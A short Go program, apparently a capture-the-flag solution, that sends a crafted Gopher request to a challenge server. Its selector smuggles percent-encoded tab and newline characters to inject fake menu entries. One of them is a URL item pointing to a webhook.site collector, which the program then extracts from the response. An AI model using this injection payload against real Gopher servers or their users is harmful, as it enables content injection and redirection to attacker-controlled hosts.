package main

import (
	"fmt"
	"log"
	"net/url"
	"strings"

	"git.mills.io/prologic/go-gopher"
)

func main() {
	serverURL := "gopher://amt.rs:31290/1/submit/%2509error.host%25091%250AiPadding%2509error.host%25091%250A0rekt%2509URL%253Ahttps%253A%252F%252Fwebhook.site%252F5f2459c5-92e4-4117-a49a-5c92ab46ab43%2509error.host%25091%250AiPadding"
	fmt.Println(url.Parse(serverURL))

	// Phân tích chuỗi URL thành một đối tượng URL
	us, err := url.Parse(serverURL)
	if err != nil {
		log.Fatal("Failed to parse URL:", err)
	}

	// In ra giá trị Host của URL
	fmt.Println(us.Host)

	// Gửi yêu cầu đến máy chủ Gopher
	res, err := gopher.Get(serverURL)
	if err != nil {
		log.Fatal("Failed to send Gopher request:", err)
	}

	// Cắt bỏ tiền tố "URL:" từ mục thứ ba trong res.Dir.Items
	gopherURL, _ := strings.CutPrefix(res.Dir.Items[2].Selector, "URL:")
	fmt.Println(gopherURL)
}
